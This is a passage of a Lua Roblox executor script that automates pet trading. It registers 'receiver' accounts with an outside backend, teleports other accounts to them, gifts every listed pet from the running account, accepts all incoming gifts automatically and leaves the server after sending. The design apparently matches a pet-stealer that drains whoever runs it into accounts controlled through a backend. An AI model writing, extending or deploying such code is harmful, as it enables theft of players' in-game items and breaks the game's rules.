        if IsVipServer() then
            AddMessage("Receiver: VIP server, moving to normal server before registration...", "warning")
            RejoinNormalServer()
            return false
        end
    else
        -- Senders don't register as receivers
        AddMessage("Sender: not registering as receiver", "info")
        return false
    end
    
    local username = LocalPlayer.Name
    local jobId = "job-" .. username .. "-" .. tostring(tick())
    local serverId = game.JobId
    
    local data = {
        receiver = username,
        jobId = jobId,
        serverId = serverId
    }
    
    local url = getgenv().Config.BackendURL .. "/api/register-job"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("Registered as receiver in backend", "success")
        AddMessage("Job ID: " .. jobId, "info")
        AddMessage("Server ID: " .. serverId, "info")
        
        -- Save jobId for later deletion
        getgenv().CurrentJobId = jobId
        return true
    else
        AddMessage("Backend registration error", "error")
        return false
    end
end

-- Function to unregister receiver
local function UnregisterAsReceiver()
    if not getgenv().Config.UseBackend or not getgenv().CurrentJobId then
        return
    end
    
    local url = getgenv().Config.BackendURL .. "/api/job/" .. getgenv().CurrentJobId
    local response = MakeHttpRequest(url, "DELETE")
    
    if response and response.success then
        AddMessage("Receiver registration removed", "success")
        getgenv().CurrentJobId = nil
        return true
    else
        AddMessage("Error removing registration", "error")
        return false
    end
end

-- Function to update receiver status
local function UpdateReceiverStatus()
    if not getgenv().Config.UseBackend then
        return
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Only receivers update status and react to VIP/full servers
    if isReceiver then
        -- Check inventory overflow
        if ShouldDisableReceiverDueToOverflow() then
            AddMessage("Receiver: disabled due to inventory overflow, not updating status", "warning")
            return false
        end
        
        -- VIP: rejoin to public
        if IsVipServer() then
            AddMessage("Receiver: VIP server, moving to normal server...", "warning")
            RejoinNormalServer()
            return false
        end
        
        -- Full: just wait on current server (no move)
        if IsServerFull() then
            AddMessage("Receiver: server is full, waiting on current server", "info")
            return false
        end
    else
        -- Senders don't update receiver status
        AddMessage("Sender: not updating receiver status", "info")
        return false
    end
    
    local username = LocalPlayer.Name
    local serverId = game.JobId
    
    local data = {
        receiver = username,
        serverId = serverId
    }
    
    local url = getgenv().Config.BackendURL .. "/api/update-receiver"
    local response = MakeHttpRequest(url, "POST", data)
    
    if response and response.success then
        AddMessage("Receiver status updated", "info")
        return true
    else
        AddMessage("Error updating status", "error")
        return false
    end
end

-- Main auto trade function
local function AutoTrade()
    if not getgenv().Config.Enabled then
        return
    end
    
    -- Check if we are a receiver
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- If we are receiver, don't execute sending logic
    if isReceiver then
        AddMessage("We are receiver, waiting for sender...", "info")
        return
    end
    
    -- Check if we have pets for trading
    if not HasPetsForTrade() then
        AddMessage("No pets for trading in inventory, waiting...", "warning")
        return
    end
    
    -- 1) очередь/резервация через бэкенд
    local reserved = RequestQueueReservation()
    local targetPlayer = nil
    if reserved then
        -- выполняем телепорт на зарезервированного реципиента
        if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= reserved.username then
            TeleportToReceiver(reserved)
            return
        end
    else
        -- 2) локальный поиск и обычная логика через /api/check-receivers
        targetPlayer = FindFirstAvailableRecipient()
    end
    if targetPlayer then
        AddMessage("Found receiver: " .. targetPlayer.Name, "success")
    else
        -- If no receiver on current server and autoteleport is enabled
        if getgenv().Config.UseBackend and getgenv().Config.AutoTeleport then
            AddMessage("No receiver found on current server, waiting for teleport...", "info")
            return
        else
            local recipientList = table.concat(getgenv().Config.Recipients, ", ")
            AddMessage("None of the recipients found on server: " .. recipientList, "error")
            return
        end
    end
    
    -- Get full inventory
    local fullInventory = GetFullInventory()
    AddMessage("Found items in inventory: " .. #fullInventory, "info")
    
    -- Look for pets to trade
    local petsToTrade = {}
    local foundPets = {}
    local usedUUIDs = {} -- For tracking unique pets
    local petToRecipients = BuildPetToRecipientsMap()
    
    for _, item in pairs(fullInventory) do
        if item:IsA("Tool") then
            local petUUID = item:GetAttribute("PET_UUID")
            if petUUID then
                local petData = GetPetData(item)
                if petData then
                    table.insert(foundPets, petData)
                    local baseName = GetBasePetName(petData.Name)
                    AddMessage("Found pet: " .. petData.Name .. " (base name: " .. baseName .. ")", "info")
                    
                    if IsPetInTradeList(petData.Name) then
                        -- Respect recipient mapping
                        if targetPlayer and not IsPetAllowedForRecipient(petData.Name, targetPlayer.Name, petToRecipients) then
                            AddMessage("Pet allowed for other recipients, skipping for " .. targetPlayer.Name .. ": " .. baseName, "info")
                        else
                        -- Check if this pet is not already added (by UUID)
                            if not usedUUIDs[petUUID] then
                                table.insert(petsToTrade, petData)
                                usedUUIDs[petUUID] = true
                                AddMessage("Pet added to trade list: " .. baseName, "success")
                            else
                                AddMessage("Pet already in trade list (duplicate): " .. baseName, "warning")
                            end
                        end
                    else
                        AddMessage("Pet NOT in trade list: " .. baseName, "warning")
                    end
                end
            else
                AddMessage("Item is not a pet: " .. item.Name, "info")
            end
        end
    end
    
    AddMessage("Total pets found: " .. #foundPets, "info")
    
    if #petsToTrade == 0 then
        AddMessage("No pets for trading in inventory", "warning")
        return
    end
    
    AddMessage("Found pets for trading: " .. #petsToTrade, "info")
    
    -- Show all found pets for debugging
    for i, petData in pairs(petsToTrade) do
        AddMessage("Pet " .. i .. ": " .. petData.Name, "info")
    end
    
    local sentCount = 0
    
    -- Create a copy of array for safe element removal
    local petsToSend = {}
    for i, petData in pairs(petsToTrade) do
        petsToSend[i] = petData
    end
    
    for i = #petsToSend, 1, -1 do
        local petData = petsToSend[i]
        
        -- Check if pet still exists
        if petData and petData.Tool and petData.Tool.Parent then
            -- First equip the pet
            if EquipPet(petData) then
                task.wait(0.5) -- Small delay after equipping
                
                -- Then send
                if SendPet(petData, targetPlayer or (reserved and FindPlayerByName(reserved.username))) then
                    sentCount = sentCount + 1
                    task.wait(1) -- Delay between sends
                    
                    -- Remove pet from list after successful send
                    table.remove(petsToSend, i)
                end
            end
        else
            -- Remove pet from list if it no longer exists
            table.remove(petsToSend, i)
        end
    end
    
    if sentCount > 0 then
        AddMessage("Sent pets: " .. sentCount, "success")
        -- освободить резервацию, если была
        if reserved and reserved.username then
            ReleaseQueueReservation(reserved.username)
        end
        
        -- Check if we are sender
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        -- If we are sender and successfully sent pets, leave server
        if not isReceiver and getgenv().Config.LeaveServerAfterTrade then
            AddMessage("Sender: trade completed, leaving server in 3 seconds...", "info")
            task.wait(3) -- Small delay before leaving
            LeaveServerAfterTrade()
        elseif not isReceiver and not getgenv().Config.LeaveServerAfterTrade then
            AddMessage("Sender: trade completed, staying on server (setting disabled)", "info")
        end
    end
end

-- Incoming gifts handler
GiftPet.OnClientEvent:Connect(function(giftId, petName, senderName)
    AddMessage("Received gift from: " .. senderName .. " Pet: " .. petName, "success")
    
    -- Automatically accept all gifts
    AcceptGift(giftId)
end)

-- Main loop
local function MainLoop()
    while getgenv().Config.Enabled do
        task.wait(5) -- Check every 5 seconds
        
        local shouldContinue = false
        
        -- Periodically check server status
        if getgenv().Config.UseBackend then
            -- Check if we are a receiver
            local isReceiver = false
            for _, username in pairs(getgenv().Config.Recipients) do
                if username == LocalPlayer.Name then
                    isReceiver = true
                    break
                end
            end
            
            if isReceiver then
                -- Receivers move from VIP and full servers
                if IsVipServer() then
                    AddMessage("Receiver: VIP server in main loop, moving...", "warning")
                    RejoinNormalServer()
                    task.wait(10) -- Wait longer after moving
                    shouldContinue = true
                elseif IsServerFull() then
                    AddMessage("Receiver: server is full in main loop, waiting on current server", "info")
                    shouldContinue = true
                end
            else
                -- Senders stay on their servers
                if IsVipServer() then
                    AddMessage("Sender: VIP server, staying on current server", "info")
                elseif IsServerFull() then
                    AddMessage("Sender: server is full, staying on current server", "info")
                end
            end
        end
        
        if not shouldContinue then
            AutoTrade()
        end
    end
end

-- Receiver loop (registration and status updates)
local function ReceiverLoop()
    -- Register as receiver on startup
    if getgenv().Config.UseBackend then
        task.wait(2) -- Small delay for loading
        RegisterAsReceiver()
    end
    
    while getgenv().Config.Enabled do
        task.wait(30) -- Update status every 30 seconds
        
        -- Сбросить флаг уведомления, если инвентарь нормализован
        ResetInventoryNotificationIfNormalized()
        
        local shouldContinue = false
        
        -- Check server status before update (only for receivers)
        if getgenv().Config.UseBackend then
            -- Check if we are a receiver
            local isReceiver = false
            for _, username in pairs(getgenv().Config.Recipients) do
                if username == LocalPlayer.Name then
                    isReceiver = true
                    break
                end
            end
            
            if isReceiver then
                -- Check inventory overflow
                if ShouldDisableReceiverDueToOverflow() then
                    AddMessage("Receiver: disabled due to inventory overflow in receiver loop", "warning")
                    task.wait(60) -- Wait longer when overflowed
                    shouldContinue = true
                else
                    -- Only receivers check and move
                    if IsVipServer() then
                        AddMessage("Receiver: VIP server in receiver loop, moving...", "warning")
                        RejoinNormalServer()
                        task.wait(10)
                        shouldContinue = true
                    elseif IsServerFull() then
                        AddMessage("Receiver: server is full in receiver loop, waiting on current server", "info")
                        shouldContinue = true
                    end
                end
            end
        end
        
        if not shouldContinue and getgenv().Config.UseBackend then
            UpdateReceiverStatus()
        end
    end
end

-- Start main loop
task.spawn(MainLoop)

-- Start receiver loop
task.spawn(ReceiverLoop)

-- Commands for management
local function CreateCommands()
    local function ToggleAutoTrade()
        getgenv().Config.Enabled = not getgenv().Config.Enabled
        AddMessage("Auto trade: " .. (getgenv().Config.Enabled and "Enabled" or "Disabled"), "info")
    end
    
    local function SetTargetPlayer(username)
        -- Clear recipients list and add one player
        getgenv().Config.Recipients = {username}
        AddMessage("Target player set: " .. username, "info")
    end
    
    local function AddRecipient(username)
        -- Check if player is already in list
        for _, existingPlayer in pairs(getgenv().Config.Recipients) do
            if existingPlayer == username then
                AddMessage("Player " .. username .. " already in recipients list", "warning")
                return
            end
        end
        
        table.insert(getgenv().Config.Recipients, username)
        AddMessage("Recipient added: " .. username, "success")
    end
    
    local function RemoveRecipient(username)
        for i, player in pairs(getgenv().Config.Recipients) do
            if player == username then
                table.remove(getgenv().Config.Recipients, i)
                AddMessage("Recipient removed: " .. username, "warning")
                break
            end
        end
    end
    
    local function ShowRecipients()
        AddMessage("=== Recipients List ===", "info")
        for i, player in pairs(getgenv().Config.Recipients) do
            AddMessage(i .. ". " .. player, "info")
        end
        AddMessage("======================", "info")
    end
    
    local function AddPetToTradeList(petName)
        table.insert(getgenv().Config.PetsToTrade, petName)
        AddMessage("Pet added to trade list: " .. petName, "success")
    end
    
    local function RemovePetFromTradeList(petName)
        for i, pet in pairs(getgenv().Config.PetsToTrade) do
            if pet == petName then
                table.remove(getgenv().Config.PetsToTrade, i)
                AddMessage("Pet removed from trade list: " .. petName, "warning")
                break
            end
        end
    end
    
    local function ShowConfig()
        AddMessage("=== Auto Trade Configuration ===", "info")
        AddMessage("Status: " .. (getgenv().Config.Enabled and "Enabled" or "Disabled"), "info")
        AddMessage("Backend: " .. (getgenv().Config.UseBackend and "Enabled" or "Disabled"), "info")
        AddMessage("Auto Teleport: " .. (getgenv().Config.AutoTeleport and "Enabled" or "Disabled"), "info")
        AddMessage("Skip teleport without pets: " .. (getgenv().Config.SkipTeleportIfNoPets and "Enabled" or "Disabled"), "info")
        AddMessage("Leave server after trade: " .. (getgenv().Config.LeaveServerAfterTrade and "Enabled" or "Disabled"), "info")
        AddMessage("Backend URL: " .. getgenv().Config.BackendURL, "info")
        AddMessage("Recipients:", "info")
        for i, player in pairs(getgenv().Config.Recipients) do
            AddMessage(i .. ". " .. player, "info")
        end
        AddMessage("Pets for trading:", "info")
        for i, pet in pairs(getgenv().Config.PetsToTrade) do
            AddMessage(i .. ". " .. pet, "info")
        end
        AddMessage("=================================", "info")
    end
    
    local function ToggleBackend()
        getgenv().Config.UseBackend = not getgenv().Config.UseBackend
        AddMessage("Backend: " .. (getgenv().Config.UseBackend and "Enabled" or "Disabled"), "info")
    end
    
    local function ToggleAutoTeleport()
        getgenv().Config.AutoTeleport = not getgenv().Config.AutoTeleport
        AddMessage("Auto Teleport: " .. (getgenv().Config.AutoTeleport and "Enabled" or "Disabled"), "info")
    end
    
    local function ToggleSmartServerSearch()
        getgenv().Config.SmartServerSearch = not getgenv().Config.SmartServerSearch
        AddMessage("Smart Server Search: " .. (getgenv().Config.SmartServerSearch and "Enabled" or "Disabled"), "info")
    end
    
    local function PreviewBestServer()
        local best = FindBestPublicServer(126884695634066)
        if best then
            AddMessage("Best server preview: id=" .. tostring(best.id) .. ", players=" .. tostring(best.playing) .. "/" .. tostring(best.maxPlayers), "success")
        else
            AddMessage("Best server preview: not found", "warning")
        end
    end
    
    local function CheckBackendStatus()
        if not getgenv().Config.UseBackend then
            AddMessage("Backend disabled", "warning")
            return
        end
        
        local url = getgenv().Config.BackendURL .. "/api/stats"
        local response = MakeHttpRequest(url, "GET")
        
        if response and response.success then
            AddMessage("=== Backend Status ===", "info")
            AddMessage("Active jobs: " .. response.stats.activeJobs, "info")
            AddMessage("Active receivers: " .. response.stats.activeReceivers, "info")
            AddMessage("Server time: " .. response.stats.serverTime, "info")
            AddMessage("=====================", "info")
        else
            AddMessage("Backend connection error", "error")
        end
    end
    
    local function RegisterReceiver()
        RegisterAsReceiver()
    end
    
    local function UnregisterReceiver()
        UnregisterAsReceiver()
    end
    
    local function UpdateReceiver()
        UpdateReceiverStatus()
    end
    
    local function CheckRole()
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            AddMessage("Current role: Receiver (waiting for sender)", "success")
        else
            AddMessage("Current role: Sender (looking for receiver)", "info")
        end
    end
    
    local function CheckServerStatus()
        AddMessage("=== Статус сервера ===", "info")
        AddMessage("Job ID: " .. game.JobId, "info")
        AddMessage("Place ID: " .. game.PlaceId, "info")
        AddMessage("VIP сервер: " .. (IsVipServer() and "Да" or "Нет"), "info")
        AddMessage("Сервер полный: " .. (IsServerFull() and "Да" or "Нет"), "info")
        AddMessage("Игроков: " .. #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers, "info")
        
        -- Дополнительная информация о сервере
        if IsVipServer() then
            AddMessage("⚠️ ВНИМАНИЕ: VIP сервер обнаружен!", "warning")
            AddMessage("Рекомендуется переход на обычный сервер", "warning")
        end
        
        if IsServerFull() then
            AddMessage("⚠️ ВНИМАНИЕ: Сервер полный!", "warning")
            AddMessage("Рекомендуется переход на другой сервер", "warning")
        end
        
        AddMessage("=====================", "info")
    end
    
    local function ForceRejoinNormal()
        -- Проверяем, являемся ли мы получателем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            AddMessage("Принудительный переход на обычный сервер (получатель)...", "info")
            RejoinNormalServer()
        else
            AddMessage("Отправители не переходят на обычные серверы", "warning")
        end
    end
    
    local function CheckInventoryPets()
        AddMessage("=== Проверка питомцев в инвентаре ===", "info")
        
        local petsInInventory = GetPetsInInventory()
        local petsCount = #petsInInventory
        AddMessage("Всего питомцев в инвентаре: " .. petsCount, "info")
        
        -- Проверяем переполнение для получателей
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if isReceiver then
            if petsCount > 55 then
                AddMessage("⚠️ ПЕРЕПОЛНЕНИЕ ИНВЕНТАРЯ: " .. petsCount .. " питомцев!", "error")
                AddMessage("Получатель отключен от бекенда из-за переполнения (>55 питомцев)", "warning")
                AddMessage("Остаемся в игре, но не регистрируемся как получатель", "info")
                AddMessage("Рекомендуется освободить инвентарь для возобновления работы", "warning")
            elseif petsCount > 45 then
                AddMessage("⚠️ ВНИМАНИЕ: Инвентарь почти полный: " .. petsCount .. " питомцев", "warning")
                AddMessage("При достижении 55 питомцев получатель будет отключен от бекенда", "warning")
            else
                AddMessage("✅ Инвентарь в норме: " .. petsCount .. " питомцев", "success")
            end
        end
        
        if petsCount == 0 then
            AddMessage("❌ Нет питомцев в инвентаре!", "error")
            return
        end
        
        local tradePetsCount = 0
        local tradePetsList = {}
        
        for i, petData in pairs(petsInInventory) do
            local baseName = GetBasePetName(petData.Name)
            local isInTradeList = IsPetInTradeList(petData.Name)
            
            AddMessage(i .. ". " .. petData.Name .. " (основное имя: " .. baseName .. ")", "info")
            
            if isInTradeList then
                AddMessage("   ✅ В списке трейда", "success")
                tradePetsCount = tradePetsCount + 1
                table.insert(tradePetsList, petData.Name)
            else
                AddMessage("   ❌ НЕ в списке трейда", "warning")
            end
        end
        
        AddMessage("=== Результат ===", "info")
        AddMessage("Питомцев для трейда: " .. tradePetsCount .. "/" .. petsCount, "info")
        
        if tradePetsCount > 0 then
            AddMessage("✅ Готов к трейду!", "success")
            AddMessage("Питомцы для трейда:", "info")
            for i, petName in pairs(tradePetsList) do
                AddMessage("  " .. i .. ". " .. petName, "info")
            end
        else
            AddMessage("❌ Нет питомцев для трейда!", "error")
            AddMessage("Добавьте питомцев в список трейда или получите нужных питомцев", "warning")
        end
        
        AddMessage("=======================", "info")
    end
    
    local function ToggleSkipTeleportIfNoPets()
        getgenv().Config.SkipTeleportIfNoPets = not getgenv().Config.SkipTeleportIfNoPets
        AddMessage("Пропуск телепорта без питомцев: " .. (getgenv().Config.SkipTeleportIfNoPets and "Включен" or "Выключен"), "info")
    end
    
    local function ToggleLeaveServerAfterTrade()
        getgenv().Config.LeaveServerAfterTrade = not getgenv().Config.LeaveServerAfterTrade
        AddMessage("Выход с сервера после трейда: " .. (getgenv().Config.LeaveServerAfterTrade and "Включен" or "Выключен"), "info")
    end
    
    local function ForceLeaveServer()
        -- Проверяем, являемся ли мы отправителем
        local isReceiver = false
        for _, username in pairs(getgenv().Config.Recipients) do
            if username == LocalPlayer.Name then
                isReceiver = true
                break
            end
        end
        
        if not isReceiver then
            AddMessage("Принудительный выход с сервера (отправитель)...", "info")
            LeaveServerAfterTrade()
        else
            AddMessage("Получатели не выходят с сервера принудительно", "warning")
        end
    end
    
    -- Глобальные команды
    _G.ToggleAutoTrade = ToggleAutoTrade
    _G.SetTargetPlayer = SetTargetPlayer
    _G.AddRecipient = AddRecipient
    _G.RemoveRecipient = RemoveRecipient
    _G.ShowRecipients = ShowRecipients
    _G.AddPetToTradeList = AddPetToTradeList
    _G.RemovePetFromTradeList = RemovePetFromTradeList
    _G.ShowConfig = ShowConfig
    _G.ToggleBackend = ToggleBackend
    _G.ToggleAutoTeleport = ToggleAutoTeleport
    _G.ToggleSmartServerSearch = ToggleSmartServerSearch
    _G.PreviewBestServer = PreviewBestServer
    _G.CheckBackendStatus = CheckBackendStatus
    _G.RegisterReceiver = RegisterReceiver
    _G.UnregisterReceiver = UnregisterReceiver
    _G.UpdateReceiver = UpdateReceiver
    _G.CheckRole = CheckRole
    _G.CheckServerStatus = CheckServerStatus
    _G.ForceRejoinNormal = ForceRejoinNormal
    _G.CheckInventoryPets = CheckInventoryPets
    _G.ToggleSkipTeleportIfNoPets = ToggleSkipTeleportIfNoPets
    _G.ToggleLeaveServerAfterTrade = ToggleLeaveServerAfterTrade
    _G.ForceLeaveServer = ForceLeaveServer
    
    AddMessage("=== Авто трейд скрипт загружен ===", "success")
    
    -- Проверяем роль текущего игрока
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        AddMessage("РОЛЬ: Получатель (ожидаем отправителя)", "success")
    else
        AddMessage("РОЛЬ: Отправитель (ищем получателя)", "info")
    end
    for i, player in pairs(getgenv().Config.Recipients) do
        AddMessage(i .. ". " .. player, "info")
    end
    AddMessage("Текущий список питомцев для трейда:", "info")
    for i, pet in pairs(getgenv().Config.PetsToTrade) do
        AddMessage(i .. ". " .. pet, "info")
    end
    
    -- Проверяем статус бекенда при запуске
    if getgenv().Config.UseBackend then
        CheckBackendStatus()
    end
    
    -- Проверяем статус сервера при запуске
    task.wait(1) -- Небольшая задержка для загрузки
    CheckServerStatus()
    
    -- Проверяем роль и статус сервера при запуске
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    if isReceiver then
        -- Получатели переходят с VIP серверов
        if IsVipServer() then
            AddMessage("Получатель: автоматический переход с VIP сервера на обычный...", "warning")
            RejoinNormalServer()
        end
    else
        -- Отправители остаются на своих серверах
        if IsVipServer() then
            AddMessage("Отправитель: VIP сервер, остаемся на текущем сервере", "info")
        end
    end
    
    -- Проверяем питомцев в инвентаре при запуске
    task.wait(2) -- Ждем загрузки персонажа
    CheckInventoryPets()
end

CreateCommands() 
